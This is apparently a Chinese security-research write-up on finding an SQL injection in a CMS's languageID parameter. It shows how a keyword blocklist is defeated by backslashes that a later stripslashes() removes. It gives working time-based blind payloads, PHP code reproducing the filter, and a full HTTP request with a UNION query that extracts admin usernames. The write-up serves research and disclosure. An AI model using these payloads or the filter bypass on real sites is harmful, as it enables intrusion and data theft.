某cms漏洞挖掘分析，该系统代码简单，因此注入漏洞发现过程还是挺顺利的，就在index.php的文件中，结果绕过waf稍微有些曲折，特此记录一下学习过程。

发现之旅
----

站点搭建过程没啥坑点，因此略过。使用的环境为PHP5.6+Apache2.4+MySQL5.7  
使用phpstorm打来站点目录，从入口开始，看index.php文件  
![image.png](https://shs3.b.qianxin.com/butian_public/f82993139e33b46f90c0f32103b5b31e6f702ea096a0d.jpg)  
Templete目录下为模板文件，暂不看；优先看web\_inc.php，还没翻几行，就发现存在疑似注入点=.=!  
![image.png](https://shs3.b.qianxin.com/butian_public/f658551e0ff44ece4d92a1b4c2eb43ef798b528e3f92e.jpg)  
![image.png](https://shs3.b.qianxin.com/butian_public/f883213252cc73c8ab29a45ae2fbffa8069cb570a03d4.jpg)  
存在以上两处对$Language直接进行调用的点。当然，目前仅是疑似，还不知道变量是否可可控以及WAF拦截情况。  
向上找到$Language的来源，发现原来是直接通过POST传进来的，感觉过程过于顺利了。但仔细看了看，发现对传递进来的值调用test\_input()和verify\_str()进行处理，存在一定的过滤。  
![image.png](https://shs3.b.qianxin.com/butian_public/f7879400c3a00bfacf292019da6cd0be8a9b95b1fe519.jpg)  
继续跟进这两个函数到contorl.php文件。看看具体的实现代码，将他们翻译成自然语言就是：  
verify\_str()会将传进来的值进行正则匹配，当存在红框中的使用`|`分割的字符时，无论大小写（忽略大小写），都会退出代码执行，并打印Sorry  
![image.png](https://shs3.b.qianxin.com/butian_public/f862227329b7ff7fa3a89a5ed746309abc182cf83d94b.jpg)  
test\_input()会对传进来的值使用一键三连，分别是去除两边空格、去除反斜杠、转移html特殊字符。这里我揉了揉眼睛，确实是`stripslashes`去除反斜杠而不是`addslashes`添加反斜杠。不知道这里为啥这样操作，算了，开发的意思，自有他的道理，反正肯定不是写错了。  
![image.png](https://shs3.b.qianxin.com/butian_public/f93607241bfdf87bc97b5ac2f0711269cf097360ebc23.jpg)  
![image.png](https://shs3.b.qianxin.com/butian_public/f188470e00b30d41a4c93dbe59d3fb23c7565c7304afd.jpg)  
（这里注意一下verify\_str和test\_input的调用顺序，后面要考）

开始爬坑
----

整理一下思路，准备开始爬坑，尝试绕过这两个函数。  
限制还是比较多，无法使用常用的字符`and``union``select``=``<``>``*`以及单引号、空格等，但感觉是有机会的。  
先分别构造0和1，发现没有任何回显与区别，这样就没办法进行布尔盲注。  
![image.png](https://shs3.b.qianxin.com/butian_public/f27582871b972aabceace8359f2c03adb4e58c5e5f13d.jpg)  
![image.png](https://shs3.b.qianxin.com/butian_public/f1234988e743ef5581e344b7634d8c4abfad8867a067a.jpg)  
之后尝试构造sleep()语句，进行时间盲注测试。结果并没有触发延迟，并且服务器返回了500错误。  
![image.png](https://shs3.b.qianxin.com/butian_public/f3193841ef438cba523cbebcd973ef657cad5fcc9409c.jpg)  
![image.png](https://shs3.b.qianxin.com/butian_public/f7480736df39dc5bcca5b26fe29d0b53b0b514d8e0d42.jpg)  
感觉比较奇怪，因此测试找了一下原因发现：  
当sleep一个较小的值，因被带入后端进行多次sql查询，实际睡眠了4s时间；也就是说之前睡眠1s，实际睡眠了40s以上，导致超时返回500状态码。  
![image.png](https://shs3.b.qianxin.com/butian_public/f304083658423a60c9ccb14c2bfa40338ecfa82954175.jpg)  
暂未对**apache请求超40s返回500**进行调整，并利用它进行盲注测试，方便通过状态码筛选数据。  
先构造判断数据库长度的语句，因为`=`被过滤，payload中使用`like`代替。

```php
languageID=(0)or(if(length(database())like(1),sleep(2),0))
```

![image.png](https://shs3.b.qianxin.com/butian_public/f352368a4ff12cacf59439b6b75bd53cca2ab232ed67e.jpg)  
![image.png](https://shs3.b.qianxin.com/butian_public/f139778e3db9db08dc15856f76163eda645a1ab89de5c.jpg)  
然后利用substr()对数据库名称进行分割，分别跑出对应的字符。因为过滤了单引号，因此这里在判断字符时使用了十六进制编码。（也可以使用ascii）

```php
languageID=(0)or(if(substr(database(),1,1)like(0x73),sleep(2),0))
```

![image.png](https://shs3.b.qianxin.com/butian_public/f4000978f2be6c337033983ceac91ec490df0826ce5aa.jpg)  
成功获得数据库名称

```php
languageID=(0)or(if(database()like(0x73656d636d73),sleep(2),0))
```

![image.png](https://shs3.b.qianxin.com/butian_public/f202754f53221143192aa70df6f1122cdfb6d59a46e9d.jpg)  
查找发现包含web\_inc.php的文件还是比较多的，因此理论上他们都会存在相同的注入问题。  
![image.png](https://shs3.b.qianxin.com/butian_public/f4622734004601a23c63776c79e55c20a25782e02b6a9.jpg)  
以/Templete/default/Include/search.php为例，进行时间盲注测试。  
![image.png](https://shs3.b.qianxin.com/butian_public/f33273262c2f3793ab3700deae7e381ccdcc63b97f588.jpg)  
成功触发与web\_inc.php情况相同的延迟。  
![image.png](https://shs3.b.qianxin.com/butian_public/f21902431be2cd913ff874629971ba08066d3462d1b13.jpg)  
其他路径下的注入点就不再详细测试，感兴趣的小伙伴可以自行去尝试。

绕过verify\_str()
---------------

上面的过程，虽然能证明存在sql注入，并能获得数据库库名等信息满足危害证明需要，但因为存在verify\_str()函数过滤了`union`、`select`、`=`等字符，是无法进一步获得表中信息。难道只能到此为止吗？  
此时，就要提到之前需要注意的verify\_str()和test\_input()的调用顺序。payload是先经过verify\_str()过滤敏感字符，之后再通过test\_input()去除两边空格、**反斜杠**、转译html特殊字符的。  
因此可以利用test\_input()可以去除反斜杠的功能，绕过verify\_str()  
编写测试代码证明这个想法：

```php
<?php
function inject_check_sql($sql_str) {

     return preg_match('/select|and|insert|=|%|<|between|update|\'|\*|union|into|load_file|outfile/i',$sql_str); 
}

function verify_str($str) { 
       if(inject_check_sql($str)) {
           return 'Sorry,You do this is wrong! (.-.)';
        } 
    return $str;
}

function test_input($data) { 
      $data = trim($data);
      $data = stripslashes($data);
      $data = htmlspecialchars($data,ENT_QUOTES);
      return $data;
   }

$test1 = 'select sleep(1)';
$test2 = 'sel\ect sleep(1)';
echo test_input(verify_str($test1));
echo '------------------';
echo test_input(verify_str($test2));
?>
```

![image.png](https://shs3.b.qianxin.com/butian_public/f3171823d52b162e84d877d029bd84debcd9e0ef489ad.jpg)  
还是以/Templete/default/Include/search.php为例，测试select是否可以成功绕过  
先使用正常payload进行测试，verify\_str()被拦截：

```php
languageID=0%20or%20if((select%20user_admin%20from%20sc_user)like%200x41646d696e,sleep(0.01),sleep(0))
```

![image.png](https://shs3.b.qianxin.com/butian_public/f2826139037e4078a742ae4d32cb1f697456d56728530.jpg)  
为select添加反斜杠绕过verify\_str()拦截：  
当从用户表中获取的用户名等于十六进制的Admin，等式成立，触发延时。

```php
languageID=0%20or%20if((sel\ect%20user_admin%20from%20sc_user)like%200x41646d696e,sleep(0.01),sleep(0))
```

![image.png](https://shs3.b.qianxin.com/butian_public/f173931071ba82fa4a78af1bae069cfa6cc1982a82cc6.jpg)  
当从用户表中获取的用户名不等于十六进制的Admin，等式不成立，未触发延时。  
![image.png](https://shs3.b.qianxin.com/butian_public/f9587320a741530565a37607aad396e2af78402dab473.jpg)

尝试回显获得数据
--------

可是时间盲注使用起来还是太麻烦了，正好也可以通过上述操作绕过union，那么就有通过联合查询的方式回显数据的可能  
查看/Templete/default/Include/search.php源码寻找回显位置，找到`tag_home`字段位置存在回显  
![image.png](https://shs3.b.qianxin.com/butian_public/f272212d54246194d7d5732c18fd97f6175b74e4bfb5a.jpg)  
通过web\_inc.php中的sql语句确定查询的数据库，在sc\_lable表中找对应的字段，为第2列  
![image.png](https://shs3.b.qianxin.com/butian_public/f62328065108844b9793b2a49067d517f82cdbbf4a263.jpg)  
![image.png](https://shs3.b.qianxin.com/butian_public/f93962412f7dc62f3c52a6fb43b386cbc90aa01d434f9.jpg)  
构造payload进行联合查询，字段数为40个，回显位在第2个，成功获得回显数据。

```php
POST /Templete/default/Include/search.php HTTP/1.1
Host: mylocal:8000
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8
Cookie: XDEBUG_SESSION11=10744
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 168

languageID=-1%20un\ion%20se\lect%201,user_admin,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40%20from%20sc_user
```

![image.png](https://shs3.b.qianxin.com/butian_public/f79057471a6d53889defb0225fdc528b90aa577509d4d.jpg)